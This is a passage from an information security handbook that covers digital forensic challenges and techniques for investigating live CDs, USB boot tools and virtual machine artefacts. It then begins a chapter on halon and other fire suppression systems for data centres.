mail systems, firewalls, VPN, anti-virus, database systems, payroll, etc. The cost of 
having a physical system for each of these functions is not trivial. By reducing the 
number of actual physical systems, there is an obvious cost savings—even taking 
into account the additional cost required to “beef up” a server to run virtual servers 
efficiently and effectively (with no noticeable depreciation in performance to the 
end users). There is also the advantage of fewer physical devices to be administered 
(granted, the same total number of servers exist in the virtual sense). By using a 
hypervisor or even VMM approach, the business reduces the number of operating 
systems that must be managed and secured, as well as the “real estate” needed to 
house these systems. Businesses can literally cut the required size of their operation 
centers by as much as 50 percent. The savings in time and effort on reduced patch 
management is also a serious consideration that influences many businesses to 
move in the direction of virtualization. Although exact numbers related to return 
on investment (ROI) are varied, the proverbial virtualization “genie” is out of the 
bottle and will not be easily stuffed back in.
Precise numbers related to the prevalence of virtual systems in the business envi-
ronment are difficult to find. If we believe the vendors and marketing companies, 
virtual systems account for hundreds of thousands of the systems deployed, and this 
number is expected to increase dramatically in the next few years (VMware 2008).
The adoption of virtualization by the home user is also an interesting phenom-
enon. The use of virtual systems, once popular with only the fringe geek, hacker, 
or hard-core techie, is moving to the average home user. Commoditized versions of 
virtualization packages originally designed for the server environment are now read-
ily available for home use at a relatively low cost (less than $100 in most cases). Some 
OS vendors are considering bundling virtualization applications directly into their 
products. As the Intel-based architecture becomes the standard for home and per-
sonal computers, home users can run mixed OS platforms on relatively moderately 
powered systems. It is not unusual to find people running a Windows® derivative and 
a Linux flavor on the same computer system and increasingly more so on laptops.

352  ◾  Information Security Management Handbook
Privacy rights activists and groups worldwide are looking to virtualization as a pos-
sible ally against intrusive businesses and government agencies. Several virtualized Web 
surfing applications/environments are available for no cost on the Internet. These solu-
tions promise anonymous or at the very least much harder to track communications and 
surfing alternatives based on the isolation and encapsulation features of virtualization. 
Many of these tools run from an external device (e.g., thumb drive), and once the device 
is removed from the host system, almost all traces of the user’s activities disappear.
As with other technology innovations, the criminal element has been quick to 
embrace virtualization. The rationale for this attraction ranges from cost savings 
(no need for multiple physical systems to run multiple operating systems), to ease 
of data/evidence obfuscation, to high portability and decreased accountability. The 
availability of preconfigured OS packages and applications, called appliances, may 
also be a factor in its rapid adoption.
Many of the advantages that we listed previously (e.g., encapsulation and isola-
tion) make the investigation of someone using virtualization much more difficult, 
as we will discuss later. Possibly one of the most difficult aspects of these investi-
gations is even identifying when a virtual machine has been used or exists on the 
system(s) in question. The accused/suspect is under no obligation to assist in the 
investigation against them. In fact, in some countries such as the United States, the 
accused is constitutionally protected from such acts (i.e., the Fifth Amendment). As 
we will discuss, investigators must take great care to identify properly that a virtual 
machine was present at the time of the activities in question (either resident on the 
system or via some externally attached device).
26.4  Challenges
One of the overall goals of performing digital forensics is to provide evidence of an 
action performed by the user. The use of virtualization makes it difficult to obtain 
the media that may contain that evidence. Virtual machines pose interesting chal-
lenges based on how they are being implemented.
Three types of virtualization techniques (Garfinkel 2007) can be used by indi-
viduals to help mask their activities. The first type makes use of live CDs. Live CDs 
are loaded with one or more bootable operating systems. The OS on the live CD 
is loaded into memory and then uses the hardware of the host machine. The hard 
drive of the host system is typically not used. The second form of virtualization is 
very similar to the live CD type, but is deployed using a USB disk drive. The VM 
type, which is the more traditional implementation in the x86 world, runs one or 
more virtual machines (guest OS) on a host system’s operating system. These virtual 
machines run on top of several services provided by the host physical machine.
Each type of virtualization can create unique challenges for investigators to 
consider. Regardless of this uniqueness, there are two main questions that an inves-
tigator needs to address:

Virtualization and Digital Investigations  ◾  353
	
1.	What data is created when a specific form of virtualization is used?
	
2.	Can this data be found after a virtualization session?
These two questions help to define a process possibly to recover evidence that would 
otherwise be overlooked. It is important to keep in mind that some forms of virtualiza-
tion leave several pieces of information behind and others leave slim to none.
26.4.1  Counter Forensics
Counter forensics and anti-forensics are not new terms to investigators. According 
to Harris (2006), anti-forensics can be defined as “methods used to prevent (or act 
against) the application of science to those criminal and civil laws that are enforced 
by police agencies in a criminal justice system” (p. S44). Building on this defini-
tion, counter forensics can be thought of as any deliberate or unintentional action 
by a user or computer program that hinders the recovery of evidence from digital 
media. Counter forensics can range from using a drive wiping tool (to erase data in 
file space or unallocated space), to formatting a drive to prepare for the installation 
of an operating system. Virtualization per se is not an anti- or counter forensic tool. 
Virtualization was designed to allow multiple applications to utilize the full poten-
tial of the resources provided by a physical machine. However, some individuals 
have found that the use of virtualization does not leave much evidence behind. This 
makes virtualization an attractive tool to conduct illegal activities.
Even though virtualization can be implemented in several ways, there are some key 
concepts that make virtual machines a popular choice to conduct illegal activities. Some 
or all of the following concepts can apply to the different forms of virtualization:
Isolation from the host or target machine is a key feature for users. The hard-
◾
◾
est part of eliminating evidence is being able to locate all the areas where data 
can be stored. With physical machines, evidence can be anywhere on the hard 
drive, from the first sector to the last sector. Evidence may be located in the 
registry, in unallocated or free space, in a temp file, a log, and numerous other 
places. Being able to isolate an area, a core function of virtualization, where 
all the data resides makes the data wiping much easier and more thorough.
Encapsulation (virtual machines only) can be seen as a form of isolation; 
◾
◾
the disk drive for a virtual machine is contained within a single flat file or 
partitioned hard drive. The data is isolated from the rest of the host machine 
and other virtual machines (VMware 2008). A virtual machine that is encap-
sulated can be hidden within a host machine and possibly overlooked by an 
investigator. The encapsulation provides the isolation needed to delete the 
potential evidence forensically.
Partitioning (virtual machines only) is another feature of virtual machines 
◾
◾
that allows the host computer to allocate all of its computing resources to sev-
eral virtual machines and store these “partitions” anywhere on the host system 

354  ◾  Information Security Management Handbook
or external device (Rosenblum 2004). This feature was designed to allow 
the VMM to divide the host machine’s resources equally among the virtual 
machines or give more resourcing power to certain virtual machines, requiring 
more power to run its applications. The lack of a standard location for parti-
tions or a traditional partition table can cause evidence to be overlooked.
Mobility is another feature popular for users. Live CDs and live USBs can be 
◾
◾
easily used on almost any machine with a CD drive or USB port. Users can 
change the boot sequence to force the physical machine to use the live CD or 
USB drive. The bootable operating system then uses generic hardware driv-
ers for the host machine. The mobility of virtualization makes it difficult to 
identify the source of the user’s actions, thus negatively impacting the process 
of ascribing accountability.
Virtual machines are not as mobile, but can still be moved relatively quickly. 
Only a couple of files are needed to transport a virtual machine from one com-
puter to another, depending on the product. A host machine must be loaded 
with the appropriate support software such as the Hypervisor and Virtual 
Machine Monitor for the virtual machine to run (Crosby and Brown 2007). 
A user could easily utilize a work computer, a library computer, a school com-
puter, or a friend’s computer without needing anything but physical access to 
the machine.
Live CDs/DVDs and live USBs are very similar in nature, but each has its 
own advantages in general. Live CDs/DVDs typically use closed sessions and are 
not writable while being used. Live CDs/DVDs are also limited by the amount of 
information that can be written to a CD or DVD. Using live CDs/DVDs is more 
deployable than using a USB drive. Most computers on the market today have 
either a CD or a DVD drive that can be used as a bootable drive. Depending on 
the capability of the host system’s BIOS, it may be able to boot off a USB drive. 
The storage capacity of USB drives can vary from whatever size the user decides 
to deploy the bootable operating system. Using a USB drive also allows a user to 
write information copied from the host machine or downloaded from the Internet 
back to the USB drive.
Even though live CDs/DVDs and live USB drives have some differences, they 
both essentially work the same. This virtualization technique works by booting the 
physical computer off the CD/DVD or USB drive. One popular tool used is Damn 
Small Linux (DSL) that can be deployed on various types of bootable media (Damn 
Small Linux 2008). It is a Debian form of Linux that only uses 50 MB. There are 
other packages and tools that can be added to the original package. The kernel 
and operating system are stored in the RAM of the host machine.* With computer 
systems today coming standard with 1 GB of RAM and expandable to as much as 
32 GB, these tools never have to write to the hard drive, thus drastically decreasing 
*	The creators of DSL state that it can run fully in only 128 MB of RAM.

Virtualization and Digital Investigations  ◾  355
the chances of discovering any evidence on the physical host. When the user is 
done with the live tool, the bootable media is then removed and the host system is 
rebooted.
Unlike live tools, virtual machines can provide a great deal of forensic evi-
dence (as we will discuss in the analysis/examination section). Even though virtual 
machines can be moved from one computer to another relatively quickly, they can-
not be deployed as easily as live tools. Recall that virtual machines require soft-
ware layered between them and the physical hardware of the host machine to run. 
Virtual machines are basically flat files that are encapsulated and stored on the 
host operating system. The virtual disks used by the virtual machine can have all 
the space allocated before the virtual machine is created or have the virtual disk 
grow when more space is required. The virtual disk can also be split into 2-GB 
files instead of one large virtual disk file (VMware 2006). There are also persistent 
and nonpersistent disk modes that determine whether or not data is written to the 
virtual disk file or discarded after a session ends (VMware 2006).
Virtual machines can be stored anywhere on the local machine, an external 
storage device, or across the network in a shared folder.
Snapshots are another challenging feature of virtual machines. Snapshots are 
saved configurations of the virtual machine, similar to a restore point on a Windows 
system. Changes made to the virtual machine after a snapshot is taken can either be 
saved or discarded (VMware 2006). A user could potentially create a new snapshot 
before some kind of illegal activity is conducted. After the user is done conducting 
such activities, the changes to the virtual machine can be discarded and the evi-
dence potentially lost.
As was stated, different forms of virtualization can be used as a counter forensic 
tool that may hinder the forensic examination. Knowing the basics of how each 
form of virtualization performs will help the forensic investigator determine how to 
proceed. It is important to understand that some forms of virtualization may pro-
vide no data of evidentiary value and others may still contain crucial data pertinent 
to the overall investigation.
26.4.2  Identification Challenges
The proper identification of virtualization is dependent on the type (i.e., live tools, 
VMM) and the vendor of the product. Being able to identify the use of a live tool 
can be very difficult because of its nature and mobility. There is no clear way to 
identify that a live tool was once used on a host computer unless an investigator 
discovers the live tool media connected to the host machine or the tool is still active 
on the host machine.
The use of a virtual machine is easier to identify than the use of live tools. 
Because virtual machines can be encapsulated within a host operating system, 
examining the file system is the best approach to use. We will discuss examinations 
in more detail later.

356  ◾  Information Security Management Handbook
26.4.3  Acquisition Challenges
Like the identification of virtualization, the acquisition of the virtual environment 
is dependent on the technology used and to some extent the vendor. Because a live 
tool loads most or all of the operating system and application into memory, it is 
quickly lost after the host machine is turned off or rebooted. It is highly unlikely 
that any information would have been written to the host system’s hard drive. An 
investigator may try to capture the contents of the memory after the fact, but this 
is a very time-critical process.*
If an investigator is lucky enough to discover a live tool still running on a 
host machine, the steps to follow are similar to acquiring a hard drive that is fully 
encrypted but the encryption key is still active on the live system. A forensic tool 
should be used to capture the entire contents of the memory of the live tool while 
it is still running. This will allow the investigator to parse through the captured 
memory at a later time. The investigator should also seize the media on which the 
live tool was deployed and make a forensic bit stream image file if possible.
The acquisition of virtual machines is not a new forensic process. Regardless 
of whether or not the virtual machine platform was using full-virtualization or 
para-virtualization mode, the data is stored as files on a host system. The files of 
virtual machines are stored like any other files on the host machine’s file system 
(see Table 26.1). Creating a forensic bit stream image of the physical media that 
contained the virtual machine is sufficient. However, investigators need to be 
aware that VMM software may not be on the same physical drive where the virtual 
machine was located.
Locating and forensically imaging the VMM is important, as it may contain 
information about the virtual machine in question. The VMM may track and log 
the usage of the virtual machine, the host user account used to run the virtual 
machine, and a more detailed configuration of the virtual machine. Again, the 
exact information stored differs from vendor to vendor.
26.5  Analysis/Examination
Two approaches can be taken to undertake an analysis of live tools. The first 
approach is to attempt to connect the live tool found with the host system it was 
created on. CDs/DVDs with closed sessions sometimes record information about 
which user created the media, when it was created, and with what program it was 
created (Crowley 2006). Live tools using USB drives can also be connected back to 
a user’s computer. Hard drives connected to a Windows system have their device 
signature stored in the registry of the machine it was connected to. When a user 
*	Researchers at the Princeton University published an article in February 2008 about how the 
contents of memory can be recovered using several methods (Halderman et al. 2008).

Virtualization and Digital Investigations  ◾  357
connects the USB live tool to his or her machine, the digital signature of the USB 
drive is recorded automatically into the Windows “MountedDevices” registry key 
of the system registry file (AccessData 2005). This information will prove useful 
when trying to find the origins of a live tool.
The second approach is to discover how the applications found on the live tools 
could be relevant to the investigation. Investigators need to look at live tools from a 
different perspective. Instead of looking for evidence on the live tool, determine its 
capabilities and look for evidence on systems it may have accessed. Even though the 
live tool may not save specific actions, its capabilities can still be determined. An 
investigator can assess the software applications found on the live tool and verify 
whether the tools located are relevant to the investigation. Applications found on the 
live tool that grab passwords, decrypt files, perform sniffing on a network, and exploit 
documentation would be important to a network intrusion/hacker investigation. By 
analyzing the capabilities of the live tool, an investigator can gain insight into what 
additional evidence may be located on other systems the live tool may have accessed.
Analyzing virtual machines will typically produce more potential evidence in 
an investigation than that of a live tool. An investigator will have two general areas 
that contain evidence. The first area is within the virtual hard disk of the virtual 
machine. This is the encapsulated area provided by the flat file structure. It is the 
actual file system of the virtual machine. The second area is the file structure of the 
host operating system outside the encapsulation of the virtual machine.
Table 26.1  Virtual Machine Files
Evidence Item
Description
Virtual disk file
This file contains the “hard drive” of the virtual 
machine
VM snapshot files
These files track changes to the VM after a 
“check point” set by the user
VM’s configuration file
This file contains the hardware settings for 
the virtual machine
VM’s BIOS configuration file
This file typically contains the BIOS settings for 
the virtual machine
VM’s memory paging file
This file contains the memory paging 
information for the virtual machine
VM’s log files
These files may log information about the 
virtual machine activity
VMM’s log files
These log files may contain information about 
the interaction between the virtual machine 
and the host machine

358  ◾  Information Security Management Handbook
The virtual disk file, the brain of the virtual machine, contains the data of 
the “hard drive” for the virtual machine. It is a flat file that contains the file sys-
tem structure of the virtual machine. The virtual disk file is very similar to that 
of a raw image file. Depending on the virtual machine platform, the virtual disk 
file can be mounted by forensic tools such as AccessData’s FTK Imager, EnCase’s 
Physical Disk Emulator, and other disk mounting utilities. Once the virtual disk 
file is mounted, a traditional approach to analysis and examination can be used 
(e.g., key word searches, file signature analysis). However, users can delete this file 
in an attempt to hide this information. If this occurs, an investigator can identify 
the sectors the virtual disk file used from the master file table (MFT) record entry 
of the host’s file system. If none of the sectors have been overwritten since the file 
deletion, it could be recoverable. A user could also forensically wipe those sectors 
the virtual disk file occupied to destroy the data permanently.
Contrary to popular belief, not all forensic evidence is lost when the virtual 
disk file is destroyed. There still may be evidence located within the file system of 
the host machine itself, such as configuration files, support files, and log files. These 
files may be located in the same folder as the virtual machine or other areas of the 
host operating system. Here again, keyword searching may yield good results (see 
Table 26.1).
An investigator should also attempt to locate the virtual machine’s configuration 
file. This type of file would typically contain all resources of the virtual machine. It 
tells the VMM how much memory the virtual machine should be using. It controls 
the hardware interaction of the host machine with the virtual machine. It typically 
points to the name and location of the virtual disk file. It also mounts hardware 
devices like the floppy disk drive, DVD/CD drives, sound devices, USB devices, 
network cards, and other physical resources from the host machine. There may also 
be a support file for the BIOS configuration for the virtual machine. (Again, this 
depends on the platform of the virtual machine).
One of the main support files not typically seen or manipulated directly by 
the user/suspect is the memory paging file. It acts as a bridge between the virtual 
machine’s memory and the memory of the host machine. The file may be visible 
while the virtual machine is running, but then is deleted after the virtual machine 
is shut down. The size of this file is usually the same amount of the memory listed 
in the configuration file. An investigator could find the MFT entry of the memory 
paging file in the host file system and acquire the sectors it occupied. The data could 
then be examined in an attempt to discover what was loaded into the memory of 
the virtual machine at one point. Such information can consist of passwords, pic-
tures, documents, encryption keys, etc.
Snapshots are a unique feature commonly associated with virtual machines. 
These files may be present if the user ever decided to use this feature. A snapshot 
is similar to that of a Windows restore point. It allows a user to restore the virtual 
machine to a previous state. After a snapshot is taken, all the changes to the virtual 
machine are stored in files that are separate from the original virtual disk. Snapshot 

Virtualization and Digital Investigations  ◾  359
images are typically mountable, similar to the virtual disk file. The snapshot may 
also capture the current state of the memory paging file. There may be entries in log 
files if snapshots are taken. Investigators should not overlook snapshots as a source 
of evidence, especially if the virtual disk file is not recovered.
Reviewing log files from VMM may also produce information pertinent to the 
investigation. Different VMM platforms will log different information and store 
the logs in different locations. The logs could be located with the virtual machine 
files or they could be stored wherever the VMM software is installed on the host 
machine. These logs files may contain the start and stop times of virtual machines. 
They can also contain more detailed information about the virtual machines while 
they were running and the files associated with each particular virtual machine.
The actual file names, extensions, and locations of the virtual machine could 
differ, depending on the VMM platform. It is important to note that with log files, 
one type/brand of VMM software may not log the same information as another. 
Furthermore, snapshot files are created only if the user has chosen this option.
An investigator must also be aware that the virtual hard drive can be stored in 
several different ways. The most common approach is using a virtual disk file. This 
method provides the encapsulation and isolation benefits previously discussed. The 
virtual disk file is a flat file that contains the file system structure of the virtual 
machine. It may be one large file or several equally sized files with a sequentially 
numbered naming convention. A virtual machine could also use unallocated raw 
disk space on the host machine. The virtual machine may appear as a bootable par-
tition on the host system. This method reduces the mobility of the virtual machine 
and could make it more difficult to delete data.
26.6  Advantages
Although it has become obvious that virtualization can present challenges to 
investigators, it is important to remember that investigators can leverage several 
of the functions of virtualization to their advantage. It is not our intention that 
this section be exhaustive of all the possible advantages that virtualization has 
for the investigator. Rather we will briefly discuss some of the more obvious 
methods and leave it up to the creativity of investigators and readers to devise 
other approaches.
The functions or features of encapsulation and isolation can be beneficial to 
investigators. Using virtual machines, an investigator can mount a forensic bit 
stream image as a live operating system and file system and can look at the suspect’s 
“machine” in the same manner that the suspect viewed it, without having to match 
any of the physical hardware of the suspect’s system. Care must be taken not to use 
the original or library copy of the suspect’s system; it is advisable to use another 
working copy in case inadvertent changes occur. Investigators can even freeze the 
suspect image, thus preventing writes to the suspect’s image. There are a few tools 

360  ◾  Information Security Management Handbook
out there designed to assist investigators with this process (e.g., Live View). The 
ability literally to sit in front of the system and look at it as a running computer can 
speed up the analysis and examination stage, as the context of evidence becomes 
more evident; it may also be easier to spot anomalies (Bem and Huebner 2007). 
There have been several anecdotes recently where the actual desktop wallpaper or 
screensaver provided enough evidence to convict a suspect charged with possession 
of contraband images (i.e., child pornography). The investigators presented this 
evidence to the court using a virtual machine and the court was able to get a better 
feel for the context of what was on the suspect’s system.
The isolation and encapsulation features also allow investigators to examine 
suspect forensic images better for any traces of malware, which is becoming an 
increasingly popular defense strategy. By using a virtual machine environment, the 
investigators can determine not only whether the suspect had anti-virus software, 
but also whether it was operating correctly (i.e., scanning files on execution). The 
ability to isolate the suspect system in a virtual machine reduces the risk of it infect-
ing the investigator’s systems, or worse yet having some type of malware jump into 
the investigator’s network. Investigators can also run more up-to-date or better 
anti-virus scanning software and determine more definitively whether there is any 
presence of malware on the suspect’s system. This proactive approach to the defense 
strategy of the Trojan horse defense can save time for the courts, and in some cases, 
it has led to plea bargains or suspects pleading guilty.
The virtual machine environment can also assist in code analysis or reverse 
engineering of any suspected code. Various tools can be run in the suspect’s 
image virtual machine that can produce detailed debugging logs or conduct 
complicated code analysis that requires access to the memory addresses the sus-
pect code is running in. Caution must be taken when dealing with malware in 
this manner as some of these applications can determine whether they are being 
executed in a virtual environment and can mutate to seem inert or not execute 
at all.
The virtualization environments also allow the investigator to set up contained 
and protected network environments that can be easily monitored for suspicious 
activity. Investigators can create a virtual machine using the suspect’s forensic 
image and, using the virtual network interface, monitor packets that this system is 
sending. The host system running the virtual machine can be disconnected from 
the Internet or any other network, thus containing any network traffic that may be 
generated. The data tap or packet analysis can provide clues about what IP addresses 
the suspect’s system is attempting to communicate with or retrieve information 
from. In the event that suspect software applications are located, the packet analysis 
can provide insight into any covert communications channels that may be created 
or even e-mail addresses to which information is being sent.
Investigators can leverage the cost savings of virtualization by using virtual 
machines to create a test environment to research any investigative hypotheses they 
may develop during the course of the analysis and examination. If an investigator 

Virtualization and Digital Investigations  ◾  361
develops a hypothesis about how some core piece of evidence came into existence on 
the suspect system (aka event reconstruction), they can easily simulate and model 
appropriate environments to match their assumptions and carry out controlled 
tests. It is much easier and cheaper to create several virtual machines even running 
different OS or file systems than it is to find suitable physical machines that have 
the correct install base. In some cases, virtual appliances or preconfigured virtual 
images can be found online that meet the requirements for the testing, thus even 
further reducing the effort and time required. Again, the isolation and encapsula-
tion functions allow for the investigator effectively to control what the environment 
is doing and measure accurately changes to the file system or other critical com-
ponents during the testing. This ability to control as many extraneous variables as 
possible is consistent with the scientific and empirical approach to research, and can 
usually stand up to any judicial scrutiny as well.
26.7  Summary
Digital investigation is a challenging area, as we are all aware. As new technolo-
gies emerge, investigators and the courts will be constantly required to keep up to 
date and be flexible in their approach in determining how best to deal with digital 
evidence. As we have seen with virtualization, sometimes it is the older and nearly 
forgotten technologies that re-emerge and cause us to pause and reconsider our 
methodologies and procedures.
The various incarnations of virtualization (full-virtualization, para-virtual-
ization), the different modes (Hypervisor, VMM), and the numerous platforms 
that can host virtual environments (Windows, UNIX, Linux, Mac OS X) present 
numerous challenges to investigators. The very features of virtualization that make 
it attractive to business and home users (cost savings, isolation, encapsulation, por-
tability, etc.) also make this technology attractive to individuals wishing to main-
tain or enhance privacy. The criminal element has also embraced virtualization as 
a way of obfuscating their illicit activities. This obfuscation can be accomplished 
through third-party runtime application or live tools that leave almost no traces 
once the media is removed, or VMM solutions that create flat files that can be easily 
wiped by the end user and quite effectively overwritten. The ability to move running 
applications across networks and the Internet with no disruption can also result in 
serious complications related to jurisdiction and transnational cooperation.
As was discussed, virtualization has advantages for the investigator as well. The 
ability to use virtual machines to model the suspect’s computing environment can 
greatly reduce the time required for analysis and examination. This ability to recre-
ate the suspect’s computing environment (at the same time satisfying the courts 
that it is an accurate replica that is not prejudicial) can assist investigators in pre-
senting evidence to the courts in a manner that also maintains the context of the 
suspect’s digital behavior.

362  ◾  Information Security Management Handbook
Whether we are comfortable with the pace of change in technology or not is 
irrelevant. As the saying goes, the only constant here is change. It behooves inves-
tigators and the courts to embrace this change as a fact, and at the same time 
not respond to the changes with knee-jerk reactions. Any changes in investigative 
methods, procedures, or protocols that could affect the admissibility of evidence 
need to be understood properly and vetted against the backdrop of sound forensic 
science and jurisprudence before being adopted.
As was promised, we will now peer into the crystal ball and try to predict what 
the not-too-distant future holds for virtualization. Given the fact that the CPU 
manufacturers are building virtualization components right into their chips, it is 
safe to say that virtualization is the wave of the future. Using where we currently 
are as a baseline and extrapolating out, it will not be long until discussions related 
to what OS or file system you have on your business server or home system will be 
moot. Virtual appliances that are configured and implemented on whatever plat-
form is best suited to the required functionality will replace the concept of host 
operating systems. You will literally have a different virtual machine for e-mail, 
Web surfing, Internet banking, etc. These virtual machines could be running on a 
Linux, OS X, or XP/Vista base, or some other modified operating system and ker-
nel. The computer would truly become personal, as you would take your desktop 
with you on an external device and, via the Internet or an intranet, have access to 
all your files on any system literally anywhere in the world.
The business computing environment will become far more virtual with the 
ability of administrators to move running applications across the entire environ-
ment while these applications/services continue to function in a production state. 
The old days of walking into a server farm and being awed by the physical num-
ber of servers and racks will be replaced by being in awe of the number of virtual 
environments running on the single large server—somewhat reminiscent of the 
mainframe days.
The criminal element will also come along for the ride and will undoubtedly 
come up with new and more interesting methods for anti- or counter forensics and 
evidence/activity obfuscation, further complicating our lives. It is foolish to specu-
late that we will ever get ahead of the technology change and innovation curve. The 
best we can hope for is that investigators and the courts at least keep sight of the 
crest as it continues on unabated into the future.
References
AccessData. 2005. Registry quick-find chart. Retrieved February 14th, 2008, from 
http://support.accessdata.com.
Barham, P., Dragovic, B., Fraser, K., Hand, S., Harris, T., Ho, A. et al. (2003, October 
19–22). Xen and the Art of Virtualization. Paper presented at the SOSP’03, Bolton 
Landing, New York.

Virtualization and Digital Investigations  ◾  363
Bem, D. and Huebner, E. 2007. Computer forensics analysis in a virtual environment [elec-
tronic version]. International Journal of Digital Evidence, 6, from www.ijde.org.
Crosby, S. and Brown, D. 2007. The virtualization reality. ACM Queue, December, 34–41.
Crowley, P. 2006. CD and DVD Forensics (first ed.). Rockland, Massachusetts: Syngress 
Publishing.
DSL. n.d. Damn Small Linux. Retrieved Feb 16, 2008, from http://damnsmalllinux.org.
Garfinkel, S. 2007. Anti-forensics: Techniques, detection, and countermeasures. Retrieved 
February 1, 2008, from http://www.simson.net/ref/2007/ICIW.pdf.
Halderman, J.A., Schoen, S.D., Heninger, N., Clarkson, W., Paul, W., Calandrino, J.A. et al. 
2008. Lest we remember: Cold boot attacks on encryption keys. Princeton University.
Harris, R. 2006. Arriving at an anti-forensics consensus: Examining how to define and con-
trol the anti-forensics problem. Digital Investigations, S44–S49.
Pollitt, M., Nance, K., Hay, B., Dodge, R., and Craiger, P. 2008. Virtualization and digital 
forensics: A research and education agenda. Journal of Digital Forensic Practice 2(2), 
62–73.
Rosenblum, M. 2004. The reincarnation of virtual machines. ACM Queue, July/August, 2, 
5.
Singh, A. n.d. An introduction to virtualization. Retrieved February 1, 2008, from http://
www.kernelthread.com/publications/virtualization/.
VMware. n.d. An introduction to virtualization. Retrieved February 1, 2008, from http://
www.vmware.com/virtualization.
VMware. 2006. Virtual machine guide. Retrieved February 14, 2008, from http://www.
vmware.com/pdf/server_vm.manual.pdf.
VMware. 2008. VMware overview. VMware Server Virtualization Seminar Series (February 
27, 2008). Chicago.


10
PHYSICAL 
SECURITY


367
27
Chapter 
Halon Fire Suppression 
Systems
Chris Hare
27.1  Introduction
Fire suppression in data centers and densely packed systems in wiring closets and 
network facilities is complicated by the use of wet fire-suppression systems that 
are used in the remainder of the facility. As is well understood, adding water to 
an environment packed with operating electrical equipment and possibly battery 
backup systems can result in as much damage to the systems as the fire itself. In 
both cases—the fire or the water damage caused by the suppression system—the 
result is the same: the loss of the devices and a service disruption affecting business 
Contents
27.1	 Introduction.............................................................................................367
27.2	 Not Simply Fire Protection......................................................................368
27.3	 Understanding Fire..................................................................................368
27.4	 Classifying Fire........................................................................................369
27.5	 Fire Suppression Systems..........................................................................370
27.6	 Halon-Based Fire Suppression..................................................................371
27.7	 Halon Distribution Components.............................................................372
27.8	 Replacing Halons.....................................................................................372
27.9	 Halon Alternatives...................................................................................373
27.10	Conclusion...............................................................................................374
Works Cited.......................................................................................................374

368  ◾  Information Security Management Handbook
operations. This chapter discusses fire suppression methods focusing specifically on 
the history and operation of halon-based gaseous suppression systems.
27.2  Not Simply Fire Protection
Fire suppression systems are not only concerned with dealing with fire emergencies. 
This type of equipment and its associated contingency plans and personnel training 
constitute one component in an organization’s business continuity plan. Being able 
to keep the business functioning and returning it to operation as quickly as possible 
after a fire event has occurred are primary goals of business continuity systems.
Fire suppression systems assist the organization in returning to operation as 
quickly as possible by assisting in the protection of personnel, equipment, assets, 
and records. The security professional, while having a working knowledge of fire 
suppression systems, should recognize the importance of fire suppression systems in 
the role of business continuity operations.
27.3  Understanding Fire
Before embarking on a discussion of fire suppression, a review of the characteristics 
associated with fire is necessary. According to the Merseyside Fire Liaison Panel, 
fire is “a process involving rapid oxidation at elevated temperatures accompanied by 
the evolution of heated gaseous products of combustion and the emission of visible 
and invisible radiation” (Fire Safety Advice Centre 2007).
The fire triangle/tetrahedron illustrated in Figure 27.1 is a two-dimensional 
view of the elements necessary for fire to occur: fuel, heat, oxygen, and chemical 
Figure 27.1  The fire tetrahedron (Fire Safety Advice Centre 2007)

Halon Fire Suppression Systems  ◾  369
reaction. Fire suppression systems operate by attempting to remove one or more of 
these elements, i.e., removing the fuel source or the specific material that is burn-
ing, lowering the heat level, removing oxygen from the surrounding air, or inter-
rupting the chemical reaction itself.
The elements of fire did not initially include the chemical reaction that occurs dur-
ing the fire. It was only after substantial research into the mechanics of fire that the 
chemical reaction aspect was fully understood: it is the nature of the chemical reac-
tion that allows for the rapid oxidization of the combustible material. Temperatures 
in a fire can reach 1800 degrees Fahrenheit in rare circumstances, although many fires 
will not reach 1000 degrees Fahrenheit (American Institute of Steel Construction 
Inc. 2008). With an oxygen-rich environment and sufficient combustible material, a 
fire can spread quickly through a facility and destroy virtually everything.
27.4  Classifying Fire
There are four classes of fires, each representing a different group of combustible 
materials. The use of the correct equipment is essential to suppressing the fire with-
out injury to personnel, equipment, or the environment. The classes of fires are 
(Riverdale Fire Department, 2007)
Class A: Ordinary combustibles or fibrous material, such as wood, paper, 
◾
◾
cloth, rubber, and some plastics
Class B: Flammable or combustible liquids such as gasoline, kerosene, paint, 
◾
◾
paint thinners, and propane
Class C: Energized electrical equipment, such as appliances, switches, panel 
◾
◾
boxes, and power tools
Class D: Certain combustible metals, such as magnesium, titanium, potas-
◾
◾
sium, and sodium, which burn at high temperatures and give off sufficient 
oxygen to support combustion
Each fire suppression system has a fire rating or indicator identifying the types 
of fires the suppression equipment is effective against. Class A fires are extinguished 
by lowering the temperature of the combustible material below its ignition point 
using water or dry chemical. Some gas-based suppression systems can be danger-
ous when used only on this type of fire (Riverdale Fire Department, 2007). Class 
B fires, including flammable liquids like gasoline and kerosene, are extinguished 
using foam- or carbon dioxide-based suppression systems. Water-based systems are 
not only ineffective with this type of fire, but can efficiently spread the fire across a 
larger area (Riverdale Fire Department, 2007).
Class C fires involve energized electrical equipment, which fall into the category 
specifically targeted by halon-based suppression systems. To prevent damage to the 
equipment, the suppression agent must not be a conductor of electrical energy. It is 

370  ◾  Information Security Management Handbook
most common to use dry chemical or gas-based suppression systems when work-
ing with this type of fire. The final class of fire, Class D, focuses on fires involving 
certain types of metals, including magnesium, titanium, potassium, and sodium. 
These fires require specialized suppression equipment because a by-product of the 
combustion process is oxygen, which can then reinforce the combustion process. 
Because of the highly specialized suppression equipment involved, the implementa-
tion cost is high. Consequently, additional precautions involving the use, storage, 
and handling of these metals are part of the protection regimen.
27.5  Fire Suppression Systems
Modern facilities include fire suppression systems as required by national and local 
building codes to protect the facility and the safety of its occupants, as well as to 
reduce the risk to other structures. There are varieties of suppression systems avail-
able to fulfill these requirements:
Water: Affects the fuel and heat
◾
◾
Chemical: Affects the combustible material
◾
◾
Gas: Interrupts the chemical reaction
◾
◾
The selection of any specific fire suppression system will be influenced directly 
by local and national building codes. Fire suppression systems, from portable fire 
extinguishers to more elaborate systems, are intended to handle one or more of the 
various fire classifications.
Water-based systems affect the heat and fuel of the fire. Many people are famil-
iar with the traditional water-based sprinkler systems, which are found in most 
commercial buildings. These can be wet or dry systems, depending upon whether 
or not the water is already at the sprinkler head. A major disadvantage to wet sprin-
kler systems is the loss of a sprinkler head, even accidentally, which typically results 
in the system discharging its water whether or not it is needed.
Although suitable for most areas in a facility, water-based systems do not inter-
act well with operational computer systems and other electrical equipment. Water, 
as a good electrical conductor, often results in system failures due to short circuits. 
Even if the water does not directly result in the destruction of the system, the time 
to dry it out and restore it to operation is extensive.
Chemical-based systems apply a coating of chemical to the combustible materi-
als, interfering with the fire. They are best used on flammable liquids (Class B) and 
electrical fires (Class C), although they can be effectively used on Class A fires as 
well. Chemical-based systems are environmentally safe and commonly use sodium 
